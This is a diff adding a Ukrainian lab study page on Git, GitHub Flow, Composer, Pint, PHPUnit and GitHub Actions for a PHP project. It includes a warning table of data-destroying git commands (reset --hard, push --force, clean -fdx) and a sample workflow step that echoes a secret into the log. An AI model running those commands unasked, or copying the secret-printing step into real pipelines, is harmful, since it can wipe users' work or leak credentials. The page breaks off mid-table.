@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ЛР №1 — теорія та питання: Git, CI/CD, GitHub Actions</title>
+<style>
+:root{
+  --bg:#f6f7f9; --surface:#fff; --text:#1b2027; --muted:#5a6472;
+  --line:#e2e6ec; --accent:#2f6feb; --accent-soft:#eaf1fe;
+  --green:#18794e; --green-soft:#e8f6ee; --amber:#8a5a00; --amber-soft:#fdf3e0;
+  --red:#b42318; --red-soft:#fdecea; --violet:#6b3fa0; --violet-soft:#f2ecfa;
+  --code-bg:#101827; --code-text:#e7eef9; --radius:14px;
+  --shadow:0 1px 2px rgba(16,24,40,.05),0 10px 28px -16px rgba(16,24,40,.22);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:90px}
+body{margin:0;background:var(--bg);color:var(--text);
+  font:16px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased}
+code,pre,kbd{font-family:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace}
+a{color:var(--accent)}
+
+/* hero */
+.hero{background:linear-gradient(135deg,#16233f 0%,#2f6feb 58%,#4f9cf9 100%);color:#fff;padding:42px 22px 36px}
+.hero-in{max-width:1180px;margin:0 auto}
+.eyebrow{margin:0 0 10px;font-size:12px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;opacity:.85}
+.hero h1{margin:0 0 12px;font-size:clamp(25px,4vw,38px);line-height:1.18;letter-spacing:-.02em}
+.hero p{margin:0;max-width:80ch;font-size:16.5px;opacity:.94}
+.chips{margin-top:20px;display:flex;flex-wrap:wrap;gap:8px}
+.chip{background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.22);
+  border-radius:999px;padding:4px 12px;font-size:12.5px;font-weight:600;color:#fff}
+
+/* layout */
+.wrap{max-width:1180px;margin:0 auto;padding:26px 22px 70px;display:grid;
+  grid-template-columns:262px minmax(0,1fr);gap:30px;align-items:start}
+@media(max-width:960px){.wrap{grid-template-columns:1fr;gap:18px}}
+
+/* toc */
+.toc{position:sticky;top:18px;background:var(--surface);border:1px solid var(--line);
+  border-radius:var(--radius);padding:16px 14px;box-shadow:var(--shadow);max-height:calc(100vh - 36px);overflow:auto}
+@media(max-width:960px){.toc{position:static;max-height:none}}
+.toc h2{margin:0 0 10px;font-size:12px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted)}
+.toc ol{margin:0;padding-left:18px;font-size:14px}
+.toc li{margin:5px 0}
+.toc a{text-decoration:none;color:#33404f}
+.toc a:hover{color:var(--accent)}
+.toc .sep{height:1px;background:var(--line);margin:12px 0;list-style:none}
+
+/* typography */
+main{min-width:0}
+section.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);
+  padding:26px 28px;margin:0 0 22px;box-shadow:var(--shadow)}
+@media(max-width:600px){section.card{padding:20px 16px}}
+h2{font-size:23px;line-height:1.25;margin:0 0 6px;letter-spacing:-.01em}
+h2 .num{color:var(--accent);font-variant-numeric:tabular-nums;margin-right:8px}
+h3{font-size:17.5px;margin:26px 0 8px}
+h4{font-size:15px;margin:20px 0 6px;color:#2a3442}
+p{margin:10px 0}
+ul,ol{margin:10px 0;padding-left:24px}
+li{margin:5px 0}
+.small{font-size:13.5px;color:var(--muted)}
+hr{border:0;border-top:1px solid var(--line);margin:22px 0}
+
+/* code */
+pre{background:var(--code-bg);color:var(--code-text);padding:14px 16px;border-radius:11px;
+  overflow:auto;font-size:13.2px;line-height:1.6;margin:12px 0;border:1px solid #1d2b45}
+pre .c{color:#8fa4c4} /* comment-ish not used automatically */
+:not(pre)>code{background:#eef1f6;border:1px solid #e2e7ef;border-radius:6px;
+  padding:1px 6px;font-size:13.4px;color:#243044;white-space:nowrap}
+
+/* tables */
+.tw{overflow:auto;margin:14px 0;border:1px solid var(--line);border-radius:11px}
+table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:#f3f6fb;font-size:12.5px;text-transform:uppercase;letter-spacing:.05em;color:#425063}
+tbody tr:last-child td{border-bottom:0}
+tbody tr:hover{background:#fafcff}
+
+/* callouts */
+.note,.warn,.ok,.danger{border-radius:11px;padding:13px 16px;margin:14px 0;font-size:14.5px;
+  border:1px solid;border-left-width:4px}
+.note{background:var(--accent-soft);border-color:#c8dbfb;border-left-color:var(--accent)}
+.warn{background:var(--amber-soft);border-color:#f3ddb3;border-left-color:#c98a00}
+.ok{background:var(--green-soft);border-color:#bfe6d0;border-left-color:var(--green)}
+.danger{background:var(--red-soft);border-color:#f6cfca;border-left-color:var(--red)}
+.note b,.warn b,.ok b,.danger b{display:block;margin-bottom:2px}
+
+/* diagram */
+.flow{display:grid;gap:10px;margin:16px 0}
+.flow-row{display:flex;flex-wrap:wrap;gap:10px;align-items:stretch}
+.node{flex:1 1 150px;background:#f7f9fd;border:1px solid #d9e2f1;border-radius:10px;
+  padding:10px 12px;font-size:13.2px;line-height:1.45}
+.node b{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.06em;
+  color:var(--accent);margin-bottom:3px}
+.node.red{background:var(--red-soft);border-color:#f0c7c1}
+.node.red b{color:var(--red)}
+.node.green{background:var(--green-soft);border-color:#b9e2c9}
+.node.green b{color:var(--green)}
+.arrow{flex:0 0 auto;align-self:center;color:#9aa7b8;font-size:18px}
+
+/* timeline */
+.steps{counter-reset:s;list-style:none;padding:0;margin:16px 0}
+.steps li{counter-increment:s;position:relative;padding:0 0 14px 44px;margin:0}
+.steps li::before{content:counter(s);position:absolute;left:0;top:0;width:28px;height:28px;
+  border-radius:50%;background:var(--accent);color:#fff;font-size:13px;font-weight:700;
+  display:flex;align-items:center;justify-content:center}
+.steps li::after{content:"";position:absolute;left:13px;top:30px;bottom:0;width:2px;background:#dbe5f5}
+.steps li:last-child::after{display:none}
+
+/* questions */
+.qhead{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin:4px 0 6px}
+.badge{display:inline-block;font-size:11.5px;font-weight:700;letter-spacing:.06em;
+  text-transform:uppercase;padding:3px 9px;border-radius:999px;border:1px solid}
+.b-easy{background:var(--green-soft);border-color:#b9e2c9;color:var(--green)}
+.b-mid{background:var(--amber-soft);border-color:#f0d9ac;color:var(--amber)}
+.b-hard{background:var(--violet-soft);border-color:#dcccf2;color:var(--violet)}
+.qcount{font-size:13px;color:var(--muted)}
+details.qa{border:1px solid var(--line);border-radius:11px;padding:0;margin:10px 0;background:#fcfdff;overflow:hidden}
+details.qa summary{cursor:pointer;list-style:none;padding:13px 16px 13px 42px;position:relative;
+  font-weight:600;font-size:15px;line-height:1.45}
+details.qa summary::-webkit-details-marker{display:none}
+details.qa summary::before{content:"+";position:absolute;left:14px;top:11px;width:18px;height:18px;
+  display:flex;align-items:center;justify-content:center;border-radius:5px;background:#e9eefb;
+  color:var(--accent);font-weight:700;font-size:15px}
+details.qa[open] summary::before{content:"–"}
+details.qa summary:hover{background:#f2f6ff}
+.qa .ans{padding:2px 18px 16px;border-top:1px solid var(--line);font-size:14.6px;background:#fff}
+.qa .ans p:first-child{margin-top:10px}
+.qbar{display:flex;flex-wrap:wrap;gap:8px;margin:16px 0 8px}
+.btn{appearance:none;border:1px solid #cdd8ea;background:#fff;color:#25324a;border-radius:9px;
+  padding:7px 13px;font-size:13.5px;font-weight:600;cursor:pointer}
+.btn:hover{background:#f2f6ff;border-color:#b6c8e6}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn.primary:hover{background:#255fce}
+
+/* footer */
+footer{max-width:1180px;margin:0 auto;padding:0 22px 60px;color:var(--muted);font-size:13.5px}
+.top{position:fixed;right:18px;bottom:18px;width:42px;height:42px;border-radius:50%;
+  background:var(--accent);color:#fff;display:flex;align-items:center;justify-content:center;
+  text-decoration:none;box-shadow:0 8px 20px -6px rgba(47,111,235,.6);font-size:18px}
+
+@media print{
+  .toc,.top,.qbar,.hero{position:static}
+  body{background:#fff}
+  section.card{box-shadow:none;border:0;padding:0;margin:0 0 8px;page-break-inside:auto}
+  details.qa{page-break-inside:avoid}
+  details.qa .ans{display:block!important}
+}
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="hero-in">
+    <p class="eyebrow">Лабораторна робота №1 · Теорія та самоперевірка</p>
+    <h1>Керування версіями та CI/CD-пайплайн для PHP-проєкту</h1>
+    <p>Повний теоретичний мінімум для виконання й захисту роботи: Git, гілки, Pull Request, Composer, PSR/Pint, PHPUnit, GitHub Actions, Secrets, захист гілок, Issues/Projects — і 20 питань від простих до глибоких із розгорнутими відповідями.</p>
+    <div class="chips">
+      <span class="chip">Git · GitHub</span>
+      <span class="chip">Composer · PSR-4</span>
+      <span class="chip">Pint · PHPUnit</span>
+      <span class="chip">GitHub Actions</span>
+      <span class="chip">Branch protection</span>
+      <span class="chip">Issues · Projects</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <aside class="toc">
+    <h2>Зміст</h2>
+    <ol>
+      <li><a href="#git">Модель Git</a></li>
+      <li><a href="#branching">Стратегії гілкування</a></li>
+      <li><a href="#pr">Pull Request і рев'ю</a></li>
+      <li><a href="#commits">Conventional Commits</a></li>
+      <li><a href="#composer">Composer</a></li>
+      <li><a href="#style">PSR і Laravel Pint</a></li>
+      <li><a href="#testing">PHPUnit</a></li>
+      <li><a href="#ci">CI/CD і GitHub Actions</a></li>
+      <li><a href="#secrets">Secrets</a></li>
+      <li><a href="#protection">Захист гілок</a></li>
+      <li><a href="#issues">Issues · Projects</a></li>
+      <li><a href="#flow">Схема роботи</a></li>
+      <li><a href="#glossary">Глосарій</a></li>
+      <li class="sep"></li>
+      <li><a href="#questions"><b>Питання (21)</b></a></li>
+      <li><a href="#q-easy">— прості (4)</a></li>
+      <li><a href="#q-mid">— середні (7)</a></li>
+      <li><a href="#q-hard">— глибокі (10)</a></li>
+    </ol>
+  </aside>
+
+  <main>
+
+  <section class="card" id="git">
+    <h2><span class="num">01</span>Модель Git: що насправді зберігається</h2>
+    <p>Git — розподілена система контролю версій. «Розподілена» означає, що повна історія є в кожного клона, а сервер (GitHub) — це лише точка синхронізації. Тому <code>git commit</code> працює офлайн, а <code>git push</code> — окрема мережева операція.</p>
+
+    <h3>Три зони</h3>
+    <div class="flow">
+      <div class="flow-row">
+        <div class="node"><b>Working tree</b>Файли на диску, які ви редагуєте</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>Index / staging</b><code>.git/index</code> — що увійде в наступний коміт</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>Repository</b><code>.git/objects</code> — незмінна історія</div>
+      </div>
+    </div>
+    <p><code>git add</code> копіює зміни в індекс, <code>git commit</code> перетворює індекс на знімок в історії. Розділення індексу й коміту дозволяє комітити <b>частину</b> змін: саме так роблять атомарні коміти.</p>
+
+    <h3>Коміт — це знімок, а не diff</h3>
+    <p>Коміт містить: хеш (SHA-1/SHA-256), автора й дату, повідомлення, посилання на батьківський коміт (або кілька — тоді це merge-коміт) і вказівник на кореневе дерево. Diff обчислюється на льоту порівнянням двох знімків.</p>
+
+    <h3>Гілка — рухомий покажчик</h3>
+<pre>        main
+         │
+         ▼
+   A ← B ← C ← D
+            ▲   ▲
+            │   └── feature   (HEAD → feature)
+            └────── main</pre>
+    <p>Гілка — це файл у <code>.git/refs/heads/</code> з 40-символьним хешем. Саме тому створення гілки — операція за мікросекунди: вона не копіює файли. <code>HEAD</code> — покажчик на поточну гілку.</p>
+
+    <h3>Злиття: fast-forward і three-way</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Варіант</th><th>Коли</th><th>Результат</th></tr></thead>
+      <tbody>
+        <tr><td><b>Fast-forward</b></td><td>цільова гілка не рухалася</td><td>покажчик просто пересувається, історія лінійна, merge-коміту немає</td></tr>
+        <tr><td><b>Three-way merge</b></td><td>обидві гілки мали нові коміти</td><td>створюється merge-коміт із двома батьками</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p>Конфлікт виникає, коли обидві гілки змінили <b>однакові рядки</b> (або одна змінила, а інша видалила). Git ставить маркери <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</code> / <code>=======</code> / <code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>; далі — ручне редагування, <code>git add</code>, <code>git commit</code>. Скасувати спробу: <code>git merge --abort</code>.</p>
+
+    <div class="note"><b>merge vs rebase</b>Merge зберігає реальну історію (з мережею), rebase переписує ваші коміти поверх іншої гілки (лінійно). Rebase безпечний лише для локальних, ще не опублікованих комітів.</div>
+
+    <h3>.gitignore</h3>
+<pre>/vendor/          # залежності Composer
+.env              # локальні секрети
+.env.*
+!.env.example     # виняток — шаблон комітимо
+.phpunit.result.cache
+.idea/
+.vscode/
+*.log</pre>
+    <ul>
+      <li><code>!</code> — виняток із попереднього правила;</li>
+      <li><code>/vendor/</code> — від кореня, <code>vendor/</code> — у будь-якому місці;</li>
+      <li>файл <b>не діє</b> на вже відстежувані файли: потрібно <code>git rm --cached &lt;file&gt;</code>, інакше вони так і залишаться в історії.</li>
+    </ul>
+    <div class="warn"><b>Чому .gitignore створюють першим</b>Якщо закомітити <code>vendor/</code> або <code>.env</code> до появи правил, вони потраплять в історію. Прибрати файл потім недостатньо — він лишається в старих комітах.</div>
+
+    <h3>Небезпечні команди</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Команда</th><th>Наслідок</th></tr></thead>
+      <tbody>
+        <tr><td><code>git reset --hard</code></td><td>втрата незакомічених змін без попередження</td></tr>
+        <tr><td><code>git push --force</code></td><td>перезапис віддаленої гілки, ламає чужі клони</td></tr>
+        <tr><td><code>git clean -fdx</code></td><td>видаляє всі untracked-файли, включно з <code>.env</code></td></tr>
+        <tr><td><code>git commit --amend</code></td><td>змінює останній коміт; небезпечно, якщо вже запушено</td></tr>
+      </tbody>
+    </table>
+    </div>
+  </section>
+  <section class="card" id="branching">
+    <h2><span class="num">02</span>Стратегії гілкування</h2>
+    <p>Питання не «чи потрібні гілки», а «як довго вони живуть». Довгоживуча гілка = дорогий merge і пізній фідбек.</p>
+
+    <h3>GitFlow</h3>
+    <p><code>main</code> (релізи) + <code>develop</code> (інтеграція) + <code>feature/*</code>, <code>release/*</code>, <code>hotfix/*</code>. Потужно для версійних продуктів, надлишково для невеликих команд.</p>
+
+    <h3>GitHub Flow — наш варіант</h3>
+    <ol class="steps">
+      <li><code>main</code> завжди робочий.</li>
+      <li>Будь-яка зміна — окрема гілка від <code>main</code>.</li>
+      <li>Push → Pull Request → review → CI.</li>
+      <li>Merge у <code>main</code>, гілка видаляється.</li>
+    </ol>
+    <div class="flow">
+      <div class="flow-row">
+        <div class="node green"><b>main</b>стабільна, захищена</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>feature/*</b>ізольована робота</div>
+        <div class="arrow">→</div>
+        <div class="node"><b>PR + CI</b>перевірки й рев'ю</div>
+        <div class="arrow">→</div>
+        <div class="node green"><b>merge</b>нова версія main</div>
+      </div>
+    </div>
+
+    <h3>Trunk-based</h3>
+    <p>Усі комітять у <code>main</code> або в гілки на кілька годин; обов'язкові feature toggles і сильний CI. Вимагає зрілої культури тестів.</p>
+
+    <h3>Іменування</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Патерн</th><th>Приклад</th><th>Коли</th></tr></thead>
+      <tbody>
+        <tr><td><code>feature/&lt;name&gt;</code></td><td><code>feature-cicd-pipeline</code></td><td>нова функціональність</td></tr>
+        <tr><td><code>fix/&lt;name&gt;</code></td><td><code>fix/pint-formatting</code></td><td>виправлення бага</td></tr>
+        <tr><td><code>chore/&lt;name&gt;</code></td><td><code>chore/gitignore</code></td><td>інфраструктура, залежності</td></tr>
+        <tr><td><code>feature/issue-&lt;N&gt;</code></td><td><code>feature/issue-2</code></td><td>гілка під конкретну задачу</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p class="small">Стиль у лабі — kebab-case, без пробілів і кирилиці: простіше посилатися, менше проблем у терміналі та URL.</p>
+  </section>
+
+  <section class="card" id="pr">
+    <h2><span class="num">03</span>Pull Request і code review</h2>
+    <p><b>Pull Request</b> — запит «злити мою гілку в іншу». Технічно це <b>base</b> (гілка-приймач, <code>main</code>) і <b>head</b> (ваша гілка). Diff будується між гілками, а не між окремими комітами.</p>
+
+    <h3>Навіщо рев'ю</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Причина</th><th>Ефект</th></tr></thead>
+      <tbody>
+        <tr><td>Друга пара очей</td><td>ловить логічні помилки, які не ловлять тести</td></tr>
+        <tr><td>Передача знань</td><td>команда розуміє код, який не писала</td></tr>
+        <tr><td>Єдиний стиль</td><td>менше «шуму» в майбутніх diff</td></tr>
+        <tr><td>Контроль архітектури</td><td>«швидкий хак» не потрапляє в <code>main</code></td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>Стани рев'ю</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Стан</th><th>Значення</th></tr></thead>
+      <tbody>
+        <tr><td><b>Comment</b></td><td>зауваження без блокування</td></tr>
+        <tr><td><b>Approve</b></td><td>«згоден, можна зливати»</td></tr>
+        <tr><td><b>Changes requested</b></td><td>є блокуючі зауваження</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <div class="warn"><b>Approval ≠ коментар «+1»</b>Лічильник «2 approvals» у branch protection рахує лише формальні рев'ю: <b>Review changes → Approve → Submit review</b>. Коментар із плюсом не зарахується.</div>
+
+    <h3>Корисні механізми</h3>
+    <ul>
+      <li><b>Draft PR</b> — робота в процесі, merge заблоковано;</li>
+      <li><b>Reviewers / Assignees</b> — хто перевіряє / хто відповідальний;</li>
+      <li><b>Files changed</b> — diff із позначкою «Viewed»;</li>
+      <li><b>Checks</b> — статуси CI, обов'язкові для merge;</li>
+      <li><b>Merge strategies</b> — merge commit, squash, rebase;</li>
+      <li><b>Auto-merge</b> — злити автоматично, коли всі умови виконані.</li>
+    </ul>
+
+    <h3>Шаблон PR</h3>
+<pre>## Task link
+Closes #
+
+## What has been changed?
+
+## Important notes
+
+## Self-checks
+- [ ] Код відформатовано (pint --test)
+- [ ] Тести проходять</pre>
+    <p>Шаблон у <code>.github/PULL_REQUEST_TEMPLATE.md</code> підставляється автоматично. Він змушує автора відповісти на три питання: <b>навіщо</b> (Task link), <b>що</b> змінено, <b>на що звернути увагу</b>. Це економить цикл «а що ти тут хотів?».</p>
+  </section>
+
+  <section class="card" id="commits">
+    <h2><span class="num">04</span>Conventional Commits</h2>
+<pre>&lt;type&gt;(&lt;scope&gt;): &lt;short description&gt;
+
+[optional body]
+
+[optional footer: Fixes #2]</pre>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Тип</th><th>Призначення</th></tr></thead>
+      <tbody>
+        <tr><td><code>feat</code></td><td>нова функціональність</td></tr>
+        <tr><td><code>fix</code></td><td>виправлення бага</td></tr>
+        <tr><td><code>docs</code></td><td>документація</td></tr>
+        <tr><td><code>style</code></td><td>форматування без зміни логіки</td></tr>
+        <tr><td><code>refactor</code></td><td>переструктурування без зміни поведінки</td></tr>
+        <tr><td><code>test</code></td><td>тести</td></tr>
+        <tr><td><code>chore</code></td><td>інфраструктура, залежності</td></tr>
+        <tr><td><code>ci</code></td><td>зміни в CI-конфігурації</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p>Реальні повідомлення цієї лаби:</p>
+<pre>docs: initial README
+chore: add project skeleton, PR template and gitignore
+feat: add Calculator service and unit tests
+ci: add PHP CI pipeline (Pint + PHPUnit + secrets demo)
+style: fix Pint formatting in Calculator
+feat: add multiply() (Fixes #2)</pre>
+    <p>Навіщо: читабельний <code>git log</code>, автоматичні changelog і release, можливість визначати версію за комітами (SemVer: <code>MAJOR.MINOR.PATCH</code>).</p>
+    <div class="note"><b>Атомарність</b>Один коміт = одна логічна зміна, після якої проєкт працює. Інакше <code>git bisect</code> (пошук коміту, що зламав код) стає марним.</div>
+  </section>
+
+  <section class="card" id="composer">
+    <h2><span class="num">05</span>Composer: залежності та автозавантаження</h2>
+    <p>Composer читає <code>composer.json</code>, розв'язує граф залежностей, ставить пакети у <code>vendor/</code>, генерує <code>vendor/autoload.php</code> і фіксує точні версії в <code>composer.lock</code>.</p>
+
+    <h3>require vs require-dev</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Секція</th><th>Для чого</th><th>На продакшені</th></tr></thead>
+      <tbody>
+        <tr><td><code>require</code></td><td>потрібно застосунку для роботи</td><td>встановлюється</td></tr>
+        <tr><td><code>require-dev</code></td><td>тести, лінтери, генератори</td><td>пропускається з <code>--no-dev</code></td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p>У лабі <code>phpunit/phpunit</code> і <code>laravel/pint</code> — саме dev-залежності.</p>
+
+    <h3>PSR-4: ім'я класу → шлях до файлу</h3>
+<pre>"autoload": {
+  "psr-4": { "App\\": "app/" }
+},
+"autoload-dev": {
+  "psr-4": { "Tests\\": "tests/" }
+}</pre>
+    <p><code>App\Services\Calculator</code> → <code>app/Services/Calculator.php</code>. Правило вимагає <b>точного збігу регістру</b>. Linux-раннер регістрозалежний, Windows — ні: код може працювати локально й падати в CI.</p>
+
+    <h3>lock і vendor</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Файл/каталог</th><th>Комітити</th><th>Чому</th></tr></thead>
+      <tbody>
+        <tr><td><code>composer.json</code></td><td>так</td><td>декларація залежностей</td></tr>
+        <tr><td><code>composer.lock</code></td><td><b>так</b></td><td>точні версії → відтворювані збірки</td></tr>
+        <tr><td><code>vendor/</code></td><td><b>ні</b></td><td>відновлюється з lock</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p><code>composer install</code> ставить версії з lock; <code>composer update</code> перераховує lock. У CI — <b>завжди install</b>.</p>
+
+    <h3>Прапорці для CI</h3>
+<pre>composer install -q --no-ansi --no-interaction \
+  --no-progress --no-scripts --prefer-dist</pre>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Прапорець</th><th>Навіщо</th></tr></thead>
+      <tbody>
+        <tr><td><code>--no-interaction</code></td><td>у CI немає TTY, не можна чекати введення</td></tr>
+        <tr><td><code>--no-progress</code></td><td>прогрес-бар засмічує логи</td></tr>
+        <tr><td><code>--no-ansi</code></td><td>без кольорових escape-кодів</td></tr>
+        <tr><td><code>--prefer-dist</code></td><td>архіви замість <code>git clone</code> — швидше</td></tr>
+        <tr><td><code>--no-scripts</code></td><td>не запускати post-install скрипти</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <div class="danger"><b>Одруківка методички</b><code>--no progress</code> (з пробілом) — Composer сприймає <code>progress</code> як окремий аргумент і завершується помилкою. Правильно: <code>--no-progress</code>.</div>
+  </section>
+
+  <section class="card" id="style">
+    <h2><span class="num">06</span>PSR і Laravel Pint</h2>
+    <h3>PSR, які треба знати</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Стандарт</th><th>Про що</th></tr></thead>
+      <tbody>
+        <tr><td><b>PSR-1</b></td><td><code>&lt;?php</code> без закривального тегу, класи в StudlyCaps, константи UPPER_CASE, UTF-8 без BOM</td></tr>
+        <tr><td><b>PSR-4</b></td><td>автозавантаження: простори імен ↔ каталоги</td></tr>
+        <tr><td><b>PSR-12</b></td><td>розширений стиль: 4 пробіли, фігурні дужки, пробіли навколо операторів</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <p>Порушення, навмисно закладене в лабу:</p>
+<pre>return $x+$y;     // ❌ PSR-12: немає пробілів навколо бінарного оператора
+return $x + $y;   // ✅</pre>
+
+    <h3>Pint</h3>
+    <p>Pint — обгортка над PHP-CS-Fixer із пресетами (за замовчуванням <code>laravel</code>). Бінарник — <code>vendor/bin/pint</code>.</p>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Команда</th><th>Дія</th></tr></thead>
+      <tbody>
+        <tr><td><code>./vendor/bin/pint</code></td><td><b>виправляє</b> файли</td></tr>
+        <tr><td><code>./vendor/bin/pint --test</code></td><td><b>тільки перевіряє</b>; exit code ≠ 0 при порушеннях</td></tr>
+        <tr><td><code>./vendor/bin/pint app/Services</code></td><td>конкретний каталог</td></tr>
+        <tr><td><code>./vendor/bin/pint --preset psr12</code></td><td>інший пресет</td></tr>
+      </tbody>
+    </table>
+    </div>
+    <div class="note"><b>Чому в CI саме --test</b>CI не повинен <b>змінювати</b> код — він має <b>повідомити</b> про проблему. Інакше раннер «виправляє» файли, яких ніхто не бачить, і перевірка втрачає сенс.</div>
+
+    <h3>Чому лінт перед тестами</h3>
+    <ul>
+      <li><b>Дешево</b>: секунди проти хвилин на встановлення й прогін тестів;</li>
+      <li><b>Ранній фідбек</b>: автор одразу бачить стильову помилку;</li>
+      <li><b>Чистий diff</b>: стильові правки не змішуються з логічними;</li>
+      <li><b>Детермінованість</b>: стиль не залежить від середовища.</li>
+    </ul>
+  </section>
+  <section class="card" id="testing">
+    <h2><span class="num">07</span>PHPUnit: тести як контракт</h2>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Рівень</th><th>Що перевіряє</th><th>Швидкість</th><th>Залежності</th></tr></thead>
+      <tbody>
+        <tr><td><b>Unit</b></td><td>один клас/метод в ізоляції</td><td>мілісекунди</td><td>без БД і мережі</td></tr>
+        <tr><td><b>Integration</b></td><td>взаємодію компонентів</td><td>секунди</td><td>БД, контейнер</td></tr>
+        <tr><td><b>Feature/E2E</b></td><td>сценарій користувача</td><td>хвилини</td><td>повний стек</td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>Анатомія тесту: AAA</h3>
+<pre>public function test_add_returns_sum(): void
+{
+    $calculator = new Calculator();      // Arrange — підготовка
+    $result = $calculator-&gt;add(2, 3);    // Act     — дія
+    $this-&gt;assertSame(5, $result);       // Assert  — перевірка
+}</pre>
+    <ul>
+      <li>метод починається з <code>test</code> (або має атрибут <code>#[Test]</code>);</li>
+      <li>клас <code>extends PHPUnit\Framework\TestCase</code>;</li>
+      <li><code>assertSame</code> (<code>===</code>) краще за <code>assertEquals</code> (<code>==</code>): ловить різницю типів <code>5</code> vs <code>"5"</code>.</li>
+    </ul>
+
+    <h3>Основні твердження</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Метод</th><th>Перевіряє</th></tr></thead>
+      <tbody>
+        <tr><td><code>assertSame($exp, $act)</code></td><td>ідентичність (<code>===</code>)</td></tr>
+        <tr><td><code>assertEquals()</code></td><td>рівність (<code>==</code>)</td></tr>
+        <tr><td><code>assertTrue / assertFalse</code></td><td>булеве значення</td></tr>
+        <tr><td><code>assertCount($n, $arr)</code></td><td>кількість елементів</td></tr>
+        <tr><td><code>assertInstanceOf()</code></td><td>тип об'єкта</td></tr>
+        <tr><td><code>expectException()</code></td><td>очікуваний виняток</td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>phpunit.xml</h3>
+<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;phpunit bootstrap="vendor/autoload.php" colors="true"&gt;
+  &lt;testsuites&gt;
+    &lt;testsuite name="Unit"&gt;
+      &lt;directory&gt;tests/Unit&lt;/directory&gt;
+    &lt;/testsuite&gt;
+  &lt;/testsuites&gt;
+&lt;/phpunit&gt;</pre>
+    <p><code>bootstrap</code> підключає автозавантажувач Composer — без нього клас <code>App\Services\Calculator</code> не знайдеться.</p>
+
+    <h3>Код виходу — мова спілкування з CI</h3>
+<pre>./vendor/bin/phpunit tests/Unit        # весь каталог
+./vendor/bin/phpunit --filter=test_add # один тест
+./vendor/bin/phpunit --testdox         # читабельний вивід</pre>
+    <p><code>0</code> — успіх, <code>≠0</code> — падіння. CI реагує саме на код виходу: ненульовий → крок червоний → job червоний → merge заблокований.</p>
+  </section>
+
+  <section class="card" id="ci">
+    <h2><span class="num">08</span>CI/CD і GitHub Actions</h2>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Термін</th><th>Суть</th></tr></thead>
+      <tbody>
+        <tr><td><b>CI</b></td><td>кожна зміна автоматично збирається й перевіряється (лінт, тести)</td></tr>
+        <tr><td><b>CD (delivery)</b></td><td>артефакт завжди готовий до релізу; деплой — ручний</td></tr>
+        <tr><td><b>CD (deployment)</b></td><td>деплой автоматично після зелених перевірок</td></tr>
+      </tbody>
+    </table>
+    </div>
+
+    <h3>Анатомія workflow</h3>
+<pre>name: PHP CI Application        # назва workflow
+on:                             # тригери
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+jobs:
+  build:                        # job → ім'я статус-чеку
+    runs-on: ubuntu-latest      # раннер
+    steps:                      # кроки, послідовно
+      - uses: actions/checkout@v4
+      - uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.2'
+          tools: composer
+      - name: Install Dependencies
+        run: composer install -q --no-interaction --no-progress --prefer-dist
+      - name: Lint code with Pint
+        run: ./vendor/bin/pint --test
+      - name: Run unit tests
+        run: ./vendor/bin/phpunit tests/Unit
+      - name: Demonstrate GitHub Secrets
+        run: echo "Secret value is ${{ secrets.MY_SUPER_SECRET_KEY }}"</pre>
+    <div class="ok"><b>Головне правило структури</b>Jobs виконуються <b>паралельно</b>, кроки всередині job — <b>послідовно</b> й ділять один workspace. Залежність між jobs задається через <code>needs:</code>.</div>
+
+    <h3>YAML-пастки</h3>
+    <div class="tw">
+    <table>
+      <thead><tr><th>Порушення</th><th>Наслідок</th></tr></thead>
+      <tbody>
+        <tr><td>таби замість пробілів</td><td><code>mapping values are not allowed here</code></td></tr>
+        <tr><td>відступ не кратний 2</td><td>кроки «з'їжджають», частина не виконується</td></tr>
